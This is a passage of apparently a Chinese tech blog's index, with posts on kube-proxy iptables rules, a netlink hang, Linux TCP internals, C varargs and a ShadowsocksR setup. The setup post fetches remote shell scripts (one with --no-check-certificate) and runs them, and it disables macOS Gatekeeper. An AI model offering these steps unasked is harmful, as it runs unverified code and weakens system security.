runtime config &amp;RuntimeConfig&#123;NetworkConfig:&amp;NetworkConfig&#123;PodCidr:10.255.0.0/29,&#125;,&#125;Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: I0807 13:44:48.669902 25163 kubenet_linux.go:308] CNI network config set to &#123;Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;cniVersion&quot;: &quot;0.1.0&quot;,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;name&quot;: &quot;kubenet&quot;,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;type&quot;: &quot;bridge&quot;,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;bridge&quot;: &quot;cbr0&quot;,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;mtu&quot;: 1500,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;addIf&quot;: &quot;eth0&quot;,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;isGateway&quot;: true,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;ipMasq&quot;: false,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;hairpinMode&quot;: false,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;ipam&quot;: &#123;Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;type&quot;: &quot;host-local&quot;,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;subnet&quot;: &quot;10.255.0.0/29&quot;,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;gateway&quot;: &quot;10.255.0.1&quot;,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;routes&quot;: [Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &#123; &quot;dst&quot;: &quot;0.0.0.0/0&quot; &#125;Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: ]Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &#125;Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &#125; 12[root@VM_128_11_centos ~]# kubectl get pod --all-namespaces |grep Running | wc -l5 12345678910[root@VM_128_11_centos ~]# kubectl describe node 172.30.0.43...Non-terminated Pods: (5 in total) Namespace Name CPU Requests CPU Limits Memory Requests Memory Limits --------- ---- ------------ ---------- --------------- ------------- default guohao-555fb5456d-kjzrk 0 (0%) 0 (0%) 0 (0%) 0 (0%) default guohao-555fb5456d-lxrmn 0 (0%) 0 (0%) 0 (0%) 0 (0%) default guohao-555fb5456d-t4fq4 0 (0%) 0 (0%) 0 (0%) 0 (0%) default guohao-555fb5456d-t9k2b 0 (0%) 0 (0%) 0 (0%) 0 (0%) kube-system l7-lb-controller-95dcf7bd7-v9wx7 0 (0%) 0 (0%) 0 (0%) 0 (0%) 结论当时masksize为30和29时候都是符合预期的，但是问题是只有使用kubenet时这个patch才能正常工作，如果使用其他的CNI实现这样实现就显得很鸡肋。因为PodCIDR是被kubenet传递给host-local插件的，其余的cni插件不一定使用这个。","tags":["容器"]},{"title":"kube-proxy iptables 规则生成","path":"/2018/07/11/kube-proxy-iptables/","content":"​\t做容器也有半年了，写需求的过程中发现当我创建LoaderBalancer类型的service时候kube-proxy iptables模式会产生一条公网规则的同步到集群中的全部节点上。当时我就很奇怪为啥公网 lb 还要生成iptables规则。 ​\t在梳理 iptables 规则之前先看一下loadBalancer类型的kuberntes service的流量链路，以腾讯云为例看一下腾讯云TKE下的流量链路，通过咨询的方式知道了，腾讯云的公网方案实际是k8s的去clb去买了一个 lb，结合clb的官方产品文档，理解出来的流量的入链路如下： 1traffic in -&gt; clb(TGW-&gt;GRE tunnel-&gt;vm) -&gt; iptables -&gt; pod ​\t在腾讯云下通过腾讯云clb的产品文档，知道流量最后会到节点上，后面就是流量交给iptables（kuberntes 1.10 ipvs 特性就 stable 了）规则将流量转发到 pod 里面。 在腾讯云的 TKE 控制台创建了一个服务并选择了公网地址，并登录 node 上查看kuberntes的service信息： 1234ubuntu@VM-0-42-ubuntu:~$ kubectl get svcNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEkubernetes ClusterIP 10.123.63.1 &lt;none&gt; 443/TCP 3hsleep LoadBalancer 10.123.63.85 118.24.224.100 80:30392/TCP 6m 入流量的探索​\t通过 get svc 知道了申请到的公网 ip 是118.24.224.100。iptables -j 选项后面的参数叫target,其实-j的意思是jump，可以感性的理解为转跳到这个target上继续处理。使用这个地址在iptables里面搜索一下发现如下一个规则 (规则的跟入遵循广度优先原则): 12ubuntu@VM-0-42-ubuntu:~$ sudo iptables-save |grep 118.24.224.100-A KUBE-SERVICES -d 118.24.224.100/32 -p tcp -m comment --comment &quot;default/sleep:tcp-80-80-8r4el loadbalancer IP&quot; -m tcp --dport 80 -j KUBE-FW-KHFRG3HD2BG7I4YD ​\t以target名字作为关键字搜索如下，发现KUBE-FW-开头的其实是forward的意思不是firewall😄，发现三个新的规则第一个转跳的target叫KUBE-MARK-MASQ,第二个叫KUBE-SVC-KHFRG3HD2BG7I4YD,第三个叫KUBE-MARK-DROP。具体这些target到这个阶段是做什么的还不清楚。而且review全部的iptables-save的输出发现绝大多数的kuberntes的规则都在nat表里面。 123456ubuntu@VM-0-42-ubuntu:~$ sudo iptables-save |grep KUBE-FW-KHFRG3HD2BG7I4YD:KUBE-FW-KHFRG3HD2BG7I4YD - [0:0]-A KUBE-FW-KHFRG3HD2BG7I4YD -m comment --comment &quot;default/sleep:tcp-80-80-8r4el loadbalancer IP&quot; -j KUBE-MARK-MASQ-A KUBE-FW-KHFRG3HD2BG7I4YD -m comment --comment &quot;default/sleep:tcp-80-80-8r4el loadbalancer IP&quot; -j KUBE-SVC-KHFRG3HD2BG7I4YD-A KUBE-FW-KHFRG3HD2BG7I4YD -m comment --comment &quot;default/sleep:tcp-80-80-8r4el loadbalancer IP&quot; -j KUBE-MARK-DROP-A KUBE-SERVICES -d 118.24.224.100/32 -p tcp -m comment --comment &quot;default/sleep:tcp-80-80-8r4el loadbalancer IP&quot; -m tcp --dport 80 -j KUBE-FW-KHFRG3HD2BG7I4YD ​\t探索一下KUBE-MARK-MASQ,发现其实就是kube-proxy调用iptables给流量做个0x4000/0x4000的标记。 1234ubuntu@VM-0-42-ubuntu:~$ sudo iptables-save | grep KUBE-MARK-MASQ:KUBE-MARK-MASQ - [0:0]-A KUBE-FW-KHFRG3HD2BG7I4YD -m comment --comment &quot;default/sleep:tcp-80-80-8r4el loadbalancer IP&quot; -j KUBE-MARK-MASQ-A KUBE-MARK-MASQ -j MARK --set-xmark 0x4000/0x4000 ​\t探索一下KUBE-SVC-KHFRG3HD2BG7I4YD,发现又有一次转跳到KUBE-SEP-GZIIAEF444AZU3YY,目前目前这个阶段还不知道这个target是干嘛的。 123456ubuntu@VM-0-42-ubuntu:~$ sudo iptables-save |grep KUBE-SVC-KHFRG3HD2BG7I4YD:KUBE-SVC-KHFRG3HD2BG7I4YD - [0:0]-A KUBE-FW-KHFRG3HD2BG7I4YD -m comment --comment &quot;default/sleep:tcp-80-80-8r4el loadbalancer IP&quot; -j KUBE-SVC-KHFRG3HD2BG7I4YD-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;default/sleep:tcp-80-80-8r4el&quot; -m tcp --dport 30392 -j KUBE-SVC-KHFRG3HD2BG7I4YD-A KUBE-SERVICES -d 10.123.63.85/32 -p tcp -m comment --comment &quot;default/sleep:tcp-80-80-8r4el cluster IP&quot; -m tcp --dport 80 -j KUBE-SVC-KHFRG3HD2BG7I4YD-A KUBE-SVC-KHFRG3HD2BG7I4YD -m comment --comment &quot;default/sleep:tcp-80-80-8r4el&quot; -j KUBE-SEP-GZIIAEF444AZU3YY ​\t探索一下KUBE-MARK-DROP,发现其实就是kube-proxy调用iptables给流量做个0x8000/0x8000的标记。 1234ubuntu@VM-0-42-ubuntu:~$ sudo iptables-save | grep KUBE-MARK-DROP:KUBE-MARK-DROP - [0:0]-A KUBE-FW-KHFRG3HD2BG7I4YD -m comment --comment &quot;default/sleep:tcp-80-80-8r4el loadbalancer IP&quot; -j KUBE-MARK-DROP-A KUBE-MARK-DROP -j MARK --set-xmark 0x8000/0x8000 ​\t通过KUBE-SVC-KHFRG3HD2BG7I4YD转跳到-j DNAT --to-destination 10.123.32.5:80,这里做了流量的实际转发。 12345ubuntu@VM-0-42-ubuntu:~$ sudo iptables-save |grep KUBE-SEP-GZIIAEF444AZU3YY:KUBE-SEP-GZIIAEF444AZU3YY - [0:0]-A KUBE-SEP-GZIIAEF444AZU3YY -s 10.123.32.5/32 -m comment --comment &quot;default/sleep:tcp-80-80-8r4el&quot; -j KUBE-MARK-MASQ-A KUBE-SEP-GZIIAEF444AZU3YY -p tcp -m comment --comment &quot;default/sleep:tcp-80-80-8r4el&quot; -m tcp -j DNAT --to-destination 10.123.32.5:80-A KUBE-SVC-KHFRG3HD2BG7I4YD -m comment --comment &quot;default/sleep:tcp-80-80-8r4el&quot; -j KUBE-SEP-GZIIAEF444AZU3YY ​\t通过kuberntes的get endpoint我看到了我创建的pod的endpoint了。 1234ubuntu@VM-0-42-ubuntu:~$ kubectl get epNAME ENDPOINTS AGEkubernetes 169.254.128.13:60002 3hsleep 10.123.32.5:80 8m 为什么公网也需要生成规则？​\t目前理解是”如果 pod 或集群中节点也需要去访问这个公网的 ip 地址，可以避免流量的走公网绕一圈“。 被打了标记的流量处理方式​\t看一下被做标记的流量的处理方式： 12-A KUBE-FIREWALL -m comment --comment &quot;kubernetes firewall for dropping marked packets&quot; -m mark --mark 0x8000/0x8000 -j DROP-A KUBE-FORWARD -m comment --comment &quot;kubernetes forwarding rules&quot; -m mark --mark 0x4000/0x4000 -j ACCEPT","tags":["容器"]},{"title":"the issue of netlink hang","path":"/2017/10/30/netlink-hang/","content":"我以为我以后用不到 netlink 了呢，今天又踩坑了。 公司的基础架构监控进程的一个线程通过 netlink 去获取内核数据，阻塞 IO 不返回，导致数据丢点。 1234567891011121314151617goroutine 18735 [syscall, 42 minutes]:syscall.Syscall6(0x2d, 0x15, 0xc4206be000, 0x1000, 0x0, 0xc420345990, 0xc420345984, 0x2b, 0x7fd1b8a30ac0, 0x4535f0)\t/usr/local/go/src/syscall/asm_linux_amd64.s:44 +0x5syscall.recvfrom(0x15, 0xc4206be000, 0x1000, 0x1000, 0x0, 0xc420345990, 0xc420345984, 0x0, 0xc4205a0c00, 0x48)\t/usr/local/go/src/syscall/zsyscall_linux_amd64.go:1712 +0x99syscall.Recvfrom(0x15, 0xc4206be000, 0x1000, 0x1000, 0x0, 0x1000, 0x0, 0x103ea00, 0xc4201b1720, 0x0)\t/usr/local/go/src/syscall/syscall_unix.go:252 +0xafgithub.com/eleme/netlink.(*NetlinkSocket).Receive(0xc4201b1700, 0xc4202ebe00, 0x0, 0x0, 0x1, 0xc4201649d0)\t/go/src/github.com/eleme/netlink/socket.go:70 +0x86github.com/eleme/esm-agent/collector.readStats(0x0, 0x0, 0x0, 0x0, 0x0)\t/go/src/github.com/eleme/esm-agent/collector/tcpstat.go:133 +0x372github.com/eleme/esm-agent/collector.(*TcpStatCollector).Collect(0x109c8c8, 0x7fd1b8a2c4f8, 0xc4206adc80, 0x1, 0x2)\t/go/src/github.com/eleme/esm-agent/collector/tcpstat.go:209 +0x26github.com/eleme/esm-agent/collector/basic.(*collectorService).Start.func1(0xc4202242a0, 0x7fd1b8a2c4f8, 0xc4206adc80, 0xc4204cb0e0)\t/go/src/github.com/eleme/esm-agent/collector/basic/basic.go:36 +0x15fcreated by github.com/eleme/esm-agent/collector/basic.(*collectorService).Start\t/go/src/github.com/eleme/esm-agent/collector/basic/basic.go:45 +0x5d 上面是 calltrace，下半部分的 calltrace 是监控程序内置的分析工具。 根据 io 模型推测，并找到内核代码入口（代码参考的是 upstream 的 v3.10-rc1，线上 3.10.0-229.el7.x86_64)： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687882130 static int netlink_recvmsg(struct kiocb *kiocb, struct socket *sock,2131 struct msghdr *msg, size_t len,2132 int flags)2133 &#123;2134 struct sock_iocb *siocb = kiocb_to_siocb(kiocb);2135 struct scm_cookie scm;2136 struct sock *sk = sock-&gt;sk;2137 struct netlink_sock *nlk = nlk_sk(sk);2138 int noblock = flags&amp;MSG_DONTWAIT;2139 size_t copied;2140 struct sk_buff *skb, *data_skb;2141 int err, ret;21422143 if (flags&amp;MSG_OOB)2144 return -EOPNOTSUPP;21452146 copied = 0;21472148 skb = skb_recv_datagram(sk, flags, noblock, &amp;err);2149 if (skb == NULL)2150 goto out;21512152 data_skb = skb;21532154 #ifdef CONFIG_COMPAT_NETLINK_MESSAGES2155 if (unlikely(skb_shinfo(skb)-&gt;frag_list)) &#123;2156 /*2157 * If this skb has a frag_list, then here that means that we2158 * will have to use the frag_list skb&#x27;s data for compat tasks2159 * and the regular skb&#x27;s data for normal (non-compat) tasks.2160 *2161 * If we need to send the compat skb, assign it to the2162 * &#x27;data_skb&#x27; variable so that it will be used below for data2163 * copying. We keep &#x27;skb&#x27; for everything else, including2164 * freeing both later.2165 */2166 if (flags &amp; MSG_CMSG_COMPAT)2167 data_skb = skb_shinfo(skb)-&gt;frag_list;2168 &#125;2169 #endif21702171 msg-&gt;msg_namelen = 0;21722173 copied = data_skb-&gt;len;2174 if (len &lt; copied) &#123;2175 msg-&gt;msg_flags |= MSG_TRUNC;2176 copied = len;2177 &#125;21782179 skb_reset_transport_header(data_skb);2180 err = skb_copy_datagram_iovec(data_skb, 0, msg-&gt;msg_iov, copied);21812182 if (msg-&gt;msg_name) &#123;2183 struct sockaddr_nl *addr = (struct sockaddr_nl *)msg-&gt;msg_name;2184 addr-&gt;nl_family = AF_NETLINK;2185 addr-&gt;nl_pad = 0;2186 addr-&gt;nl_pid = NETLINK_CB(skb).portid;2187 addr-&gt;nl_groups = netlink_group_mask(NETLINK_CB(skb).dst_group);2188 msg-&gt;msg_namelen = sizeof(*addr);2189 &#125;21902191 if (nlk-&gt;flags &amp; NETLINK_RECV_PKTINFO)2192 netlink_cmsg_recv_pktinfo(msg, skb);21932194 if (NULL == siocb-&gt;scm) &#123;2195 memset(&amp;scm, 0, sizeof(scm));2196 siocb-&gt;scm = &amp;scm;2197 &#125;2198 siocb-&gt;scm-&gt;creds = *NETLINK_CREDS(skb);2199 if (flags &amp; MSG_TRUNC)2200 copied = data_skb-&gt;len;22012202 skb_free_datagram(sk, skb);22032204 if (nlk-&gt;cb &amp;&amp; atomic_read(&amp;sk-&gt;sk_rmem_alloc) &lt;= sk-&gt;sk_rcvbuf / 2) &#123;2205 ret = netlink_dump(sk);2206 if (ret) &#123;2207 sk-&gt;sk_err = ret;2208 sk-&gt;sk_error_report(sk);2209 &#125;2210 &#125;22112212 scm_recv(sock, msg, siocb-&gt;scm, flags);2213 out:2214 netlink_rcv_wake(sk);2215 return err ? : copied;2216 &#125; 😄凭着直觉开始插桩： 1234567891011# cat l.stpglobal callglobal retprobe kernel.function(&quot;netlink_recvmsg&quot;).return &#123; printf(&quot;netlink_recvmsg ret %d &quot;, ret++);&#125;probe kernel.function(&quot;netlink_recvmsg&quot;)&#123; printf(&quot;netlink_recvmsg call %d &quot;, call++);&#125; 多次重启业务的监控进程在另外一个终端观察，重启进程 5 次，发现计数稳定一段时间后（大约每 1&#x2F;30000 个调用一个回不来），出现差值。推测有个调用没有返回。 12345678910111213141516netlink_recvmsg ret 893447netlink_recvmsg call 893449netlink_recvmsg ret 893448netlink_recvmsg call 893450netlink_recvmsg ret 893449netlink_recvmsg call 893451netlink_recvmsg ret 893450netlink_recvmsg call 893452netlink_recvmsg ret 893451netlink_recvmsg call 893453netlink_recvmsg ret 893452netlink_recvmsg call 893454netlink_recvmsg ret 893453netlink_recvmsg call 893455netlink_recvmsg ret 893454 发现内核 bug？有待进一步验证，思路分析 229 内核 netlink 子系统 netlink_recvmsg 的调用细节，可能有调用没有返回。","tags":["linux"]},{"title":"quick install ShadowsocksR + tcp_bbr","path":"/2017/10/16/install-Shadowsocks-r/","content":"昨天凌晨到今天早上上班前梯子挂了，这里重新搭建一个。 DO 上入了一个$5&#x2F;M 的 Ubuntu 17.04 x32，下面就是刷脚本的事情。 安装 shadowsocksR，需要注意的事情就是不要选客户端不支持的 obfs，一开始选错了可以在/etc/shadowsocks.json 中修改，保持和客户端兼容。重启在/etc/init.d/shadowsocks restart 123wget https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocksR.shchmod a+x shadowsocksR.sh./shadowsocksR.sh 上 tcp bbr，脚本重新安装了一个内核。 123wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.shchmod +x bbr.sh./bbr.sh 记得 &#x2F;etc&#x2F;sysctl.conf 配置调整。 1234567891011121314151617181920net.core.default_qdisc = fqfs.file-max = 51200net.core.rmem_max = 67108864net.core.wmem_max = 67108864net.core.netdev_max_backlog = 250000net.core.somaxconn = 4096net.ipv4.tcp_syncookies = 1net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 0net.ipv4.tcp_fin_timeout = 30net.ipv4.tcp_keepalive_time = 1200net.ipv4.ip_local_port_range = 10000 65000net.ipv4.tcp_max_syn_backlog = 8192net.ipv4.tcp_max_tw_buckets = 5000net.ipv4.tcp_fastopen = 3net.ipv4.tcp_mem = 25600 51200 102400net.ipv4.tcp_rmem = 4096 87380 67108864net.ipv4.tcp_wmem = 4096 65536 67108864net.ipv4.tcp_mtu_probing = 1net.ipv4.tcp_congestion_control = bbr MAC 客户端推荐shadowsocksX-NG-R，野外下载的包在需要 mac 开放任意开发者 sudo spctl --master-disable，然后在 GUI 里面配置。","tags":["tips"]},{"title":"Linux kernel tcp overview","path":"/2017/10/10/linux-kernel-tcp-overview/","content":"一直想找机会梳理一下 kernel 的网络子系统，不如现在开始动手做，在梳理 kernel 前，先回顾一下操作系统提供的网络编程 API。 0x00 用户如何使用想了解一下 Linux 下的 tcp 个人认为 socket API 是肯定要介绍的，自 bsd 4.2 引入到如今已经 30 多年了，核心 api 是非常稳定见如下表格 C&#x2F;S API 服务器端： socket,bind,listen,accept,shutdown等 ———— —————————————————- 客户端： socket, connect, recv,close等 ———— —————————————————- 几个简单的接口有效的控制了网络编程的复杂度。 这些 api 围绕着一个 socket 文件操作，这个文件挂载在相对简单的 sockfs 文件系统下面 (在 socket.c 中实现)，下面这个文件操作符结构体实现描述了这个类型文件支持的文件操作。 1234567891011121314151617static const struct file_operations socket_file_ops = &#123; .owner = THIS_MODULE, .llseek = no_llseek, .read_iter = sock_read_iter, .write_iter = sock_write_iter, .poll = sock_poll, .unlocked_ioctl = sock_ioctl,#ifdef CONFIG_COMPAT .compat_ioctl = compat_sock_ioctl,#endif .mmap = sock_mmap, .release = sock_close, .fasync = sock_fasync, .sendpage = sock_sendpage, .splice_write = generic_splice_sendpage, .splice_read = sock_splice_read,&#125;; 上面这个就是体现 unix 哲学 Everything is a file 的体现，通过 vfs 抽象将函数指针放到结构体中，当对对应的文件调用就回调这个文件系统实现的回调函数，比如说我对 socket 文件进行 mmap 调用，到具体的文件系统中就是调用了 sock_mmap 这个文件系统实现。 这个 struct 已经暴露了能对 socket 的操作了，不过并不打算对这个 struct 上纠结太多。 一般的使用场景是，首先用户通过 socket 系统调用创建 ipv4 面向字节流套接字，也就是指的 TCP 套接字，当套接字创建完成过后就可以像操作文件一样操作套接字。 我们这里关注的是 ipv4 tcp 套接字是如何建立的，如何传输数据的，如何关闭的，这三个问题。 tcp linux 实现[^TCP_Implementation]tcp 虚链路的建立，有效的关闭是学习 TCP 的基础中的基础。 多场景下高效率的传输学习和研究的难点，多场景的例子有卫星链路，其特点是带宽大延迟高；广域网，其特点是背景丢包率，IDC 内部，低延迟高带宽。 tcp 套接字的建立众所周知的三次握手，客户端发起 syn，服务端 ack + syn，服务端 ack。这里一共三次，为什么是三次是因为 2 次不能进行双向确认，4 次显的没有效率多一次发包。 系统调用 socket, 通过两天函数，对应内核函数 __sock_create 12345678910111213141516int __sock_create(struct net *net, int family, int type, int protocol, struct socket **res, int kern)&#123;\tint err;\tstruct socket *sock;\tconst struct net_proto_family *pf;...\tpf = rcu_dereference(net_families[family]);\terr = -EAFNOSUPPORT;\tif (!pf) goto out_release;...\terr = pf-&gt;create(net, sock, protocol, kern);\tif (err &lt; 0) goto out_module_put;... 看上面代码是__sock_create调用已经在系统中注册的协议提供的create方法创建sock函数。 1234567891011121314151617181920212223242526272829303132/** *\tsock_register - add a socket protocol handler *\t@ops: description of protocol * *\tThis function is called by a protocol handler that wants to *\tadvertise its address family, and have it linked into the *\tsocket interface. The value ops-&gt;family corresponds to the *\tsocket system call protocol family. */int sock_register(const struct net_proto_family *ops)&#123;\tint err;\tif (ops-&gt;family &gt;= NPROTO) &#123; pr_crit(&quot;protocol %d &gt;= NPROTO(%d) &quot;, ops-&gt;family, NPROTO); return -ENOBUFS;\t&#125;\tspin_lock(&amp;net_family_lock);\tif (rcu_dereference_protected(net_families[ops-&gt;family], lockdep_is_held(&amp;net_family_lock))) err = -EEXIST;\telse &#123; rcu_assign_pointer(net_families[ops-&gt;family], ops); err = 0;\t&#125;\tspin_unlock(&amp;net_family_lock);\tpr_info(&quot;NET: Registered protocol family %d &quot;, ops-&gt;family);\treturn err;&#125;EXPORT_SYMBOL(sock_register); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127static int __init inet_init(void)&#123;\tstruct inet_protosw *q;\tstruct list_head *r;\tint rc = -EINVAL;\tsock_skb_cb_check_size(sizeof(struct inet_skb_parm));\trc = proto_register(&amp;tcp_prot, 1);\tif (rc) goto out;\trc = proto_register(&amp;udp_prot, 1);\tif (rc) goto out_unregister_tcp_proto;\trc = proto_register(&amp;raw_prot, 1);\tif (rc) goto out_unregister_udp_proto;\trc = proto_register(&amp;ping_prot, 1);\tif (rc) goto out_unregister_raw_proto;\t/* *\tTell SOCKET that we are alive... */\t(void)sock_register(&amp;inet_family_ops);#ifdef CONFIG_SYSCTL\tip_static_sysctl_init();#endif\t/* *\tAdd all the base protocols. */\tif (inet_add_protocol(&amp;icmp_protocol, IPPROTO_ICMP) &lt; 0) pr_crit(&quot;%s: Cannot add ICMP protocol &quot;, __func__);\tif (inet_add_protocol(&amp;udp_protocol, IPPROTO_UDP) &lt; 0) pr_crit(&quot;%s: Cannot add UDP protocol &quot;, __func__);\tif (inet_add_protocol(&amp;tcp_protocol, IPPROTO_TCP) &lt; 0) pr_crit(&quot;%s: Cannot add TCP protocol &quot;, __func__);#ifdef CONFIG_IP_MULTICAST\tif (inet_add_protocol(&amp;igmp_protocol, IPPROTO_IGMP) &lt; 0) pr_crit(&quot;%s: Cannot add IGMP protocol &quot;, __func__);#endif\t/* Register the socket-side information for inet_create. */\tfor (r = &amp;inetsw[0]; r &lt; &amp;inetsw[SOCK_MAX]; ++r) INIT_LIST_HEAD(r);\tfor (q = inetsw_array; q &lt; &amp;inetsw_array[INETSW_ARRAY_LEN]; ++q) inet_register_protosw(q);\t/* *\tSet the ARP module up */\tarp_init();\t/* *\tSet the IP module up */\tip_init();\t/* Setup TCP slab cache for open requests. */\ttcp_init();\t/* Setup UDP memory threshold */\tudp_init();\t/* Add UDP-Lite (RFC 3828) */\tudplite4_register();\traw_init();\tping_init();\t/* *\tSet the ICMP layer up */\tif (icmp_init() &lt; 0) panic(&quot;Failed to create the ICMP control socket. &quot;);\t/* *\tInitialise the multicast router */#if defined(CONFIG_IP_MROUTE)\tif (ip_mr_init()) pr_crit(&quot;%s: Cannot init ipv4 mroute &quot;, __func__);#endif\tif (init_inet_pernet_ops()) pr_crit(&quot;%s: Cannot init ipv4 inet pernet ops &quot;, __func__);\t/* *\tInitialise per-cpu ipv4 mibs */\tif (init_ipv4_mibs()) pr_crit(&quot;%s: Cannot init ipv4 mibs &quot;, __func__);\tipv4_proc_init();\tipfrag_init();\tdev_add_pack(&amp;ip_packet_type);\tip_tunnel_core_init();\trc = 0;out:\treturn rc;out_unregister_raw_proto:\tproto_unregister(&amp;raw_prot);out_unregister_udp_proto:\tproto_unregister(&amp;udp_prot);out_unregister_tcp_proto:\tproto_unregister(&amp;tcp_prot);\tgoto out;&#125;fs_initcall(inet_init); 1 tcp 的终止众所周知的四次挥手，为什么是四次挥手关闭呢？其实这里的四次挥手的关闭指的是两个套接字两个方向的关闭，两个套接字指的是客户端和服务端，两个方向分别是发送方和接收方。 经典正确场景：当客户端 c 准备结束数据发送了，首先发起 FIN，服务端 s 收到客户端发来 FIN 信息并返回 ACK，当前阶段 c 客户端不发送数据但是还可以接收服务端发来的数据。当 s 把数据发送完成过后准备关闭这个客户的套接字，发送 FIN 给 c，这时候服务端不能发送数据。当 c 接受接收到 s 发来的 FIN，会回复一下 ACK，当 s 收到了 ack 套接字被正常关闭。 1 更多描述参考^wiki. [^TCP_Implementation]: TCP Implementation in Linux: A Brief Tutorial","tags":["tips"]},{"title":"to explore c va arg","path":"/2017/10/09/deep-explore-c-va-arg/","content":"之前写 go 语言时候发现 go 语言支持可变长参数，且写法与 c 语言类似，就好奇了 c 语言是如何实现可变长参数的。这里参考了[^this]。 C 语言可变参数通过三个宏（va_start、va_end、va_arg）和一个类型（va_list）实现的， void va_start(va_list ap, paramN);参数：ap: 可变参数列表地址paramN: 确定的参数功能：初始化可变参数列表 (把函数在 paramN 之后的参数地址放到 ap 中)。 void va_end(va_list ap);功能：关闭初始化列表 (将 ap 置空)。 type va_arg(va_list ap, type);功能：返回下一个参数的值。 va_list：存储参数的类型信息。 综合上面 3 个宏和一个类型可以猜出如何实现 C 语言可变长参数函数：用 va_start 获取参数列表 (的地址) 存储到 ap 中，用 va_arg 逐个获取值，最后用 va_arg 将 ap 置空。 使用使用范例，计算一组 int 数的和： 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;stdarg.h&gt;#define END -1int va_sum(int first_num, ...)&#123; va_list ap; va_start(ap, first_num); int result = first_num; int temp = 0; while ((temp = va_arg(ap, int)) != END) result += temp; va_end(ap); return result;&#125;int main()&#123; int sum_val = va_sum(1, 2, 3, 4, 5, END); printf(&quot;%d&quot;, sum_val); return 0;&#125; 分析其实可变长参数的实现还是比较简单：不断从栈上根据参数字长取数据，因此不知道边界。 这一点在反汇编之下非常清楚！按照 x64 的约定传入参数 caller： 12345678910111213(gdb) disassemble mainDump of assembler code for function main: 0x00000000004005f4 &lt;+0&gt;:\tpush %rbp 0x00000000004005f5 &lt;+1&gt;:\tmov %rsp,%rbp 0x00000000004005f8 &lt;+4&gt;:\tsub $0x10,%rsp 0x00000000004005fc &lt;+8&gt;:\tmov $0xffffffff,%r9d 0x0000000000400602 &lt;+14&gt;:\tmov $0x5,%r8d 0x0000000000400608 &lt;+20&gt;:\tmov $0x4,%ecx 0x000000000040060d &lt;+25&gt;:\tmov $0x3,%edx 0x0000000000400612 &lt;+30&gt;:\tmov $0x2,%esi 0x0000000000400617 &lt;+35&gt;:\tmov $0x1,%edi 0x000000000040061c &lt;+40&gt;:\tmov $0x0,%eax 0x0000000000400621 &lt;+45&gt;:\tcallq 0x4004d7 &lt;va_sum&gt; callee： 1234567891011(gdb) disassemble va_sumDump of assembler code for function va_sum: 0x00000000004004d7 &lt;+0&gt;:\tpush %rbp 0x00000000004004d8 &lt;+1&gt;:\tmov %rsp,%rbp=&gt; 0x00000000004004db &lt;+4&gt;:\tsub $0xf0,%rsp 0x00000000004004e2 &lt;+11&gt;:\tmov %edi,-0xe4(%rbp) // 1 0x00000000004004e8 &lt;+17&gt;:\tmov %rsi,-0xa8(%rbp) // 2 0x00000000004004ef &lt;+24&gt;:\tmov %rdx,-0xa0(%rbp) // 3 0x00000000004004f6 &lt;+31&gt;:\tmov %rcx,-0x98(%rbp) // 4 0x00000000004004fd &lt;+38&gt;:\tmov %r8,-0x90(%rbp) // 5 0x0000000000400504 &lt;+45&gt;:\tmov %r9,-0x88(%rbp) // ? 根据参数的类型的字长从栈上取值。 [^this]: 深度探索 C 语言函数可变长参数","tags":["tips"]},{"title":"cfs bandwidth control","path":"/2017/09/26/cfs-bandwidth-control/","content":"之前线上 229 kernel 在使用 cgroup cpu 子系统导致 crash，后又有在 3.10.0-514.26.2.el7 kernel 又出现 crash，让我对这个特性额外的关注了一下。 在分析 cfs bandwidth control 特性之前需要先知道 fair group scheduling 是什么，引用 zhihu[^zhihu]的一个回答。 普通进程的组调度支持 (Fair Group Scheduling), 2.6.24(2008 年 1 月发布) 2.6.23 引入的 CFS 调度器对所有进程完全公平对待。但这有个问题，设想当前机器有 2 个用户，有一个用户跑着 9 个进程，还都是 CPU 密集型进程；另一个用户只跑着一个 X 进程，这是交互性进程。从 CFS 的角度看，它将平等对待这 10 个进程，结果导致的是跑 X 进程的用户受到不公平对待，他只能得到约 10% 的 CPU 时间，让他的体验相当差。基于此，组调度的概念被引入[6]。CFS 处理的不再是一个进程的概念，而是调度实体 (sched entity), 一个调度实体可以只包含一个进程，也可以包含多个进程。因此，上述例子的困境可以这么解决：分别为每个用户建立一个组，组里放该用户所有进程，从而保证用户间的公平性。该功能是基于控制组 (control group, cgroup) 的概念，需要内核开启 CGROUP 的支持才可使用。 巧的是知乎的这个回答里面也提到了 cfs bandwidth control 是什么 组调度带宽控制 (CFS bandwidth control) , 3.2(2012 年 1 月发布) 组调度的支持，对实现多租户系统的管理是十分方便的，在一台机器上，可以方便对多用户进行 CPU 均分．然后，这还不足够，组调度只能保证用户间的公平，但若管理员想控制一个用户使用的最大 CPU 资源，则需要带宽控制．针对 CFS 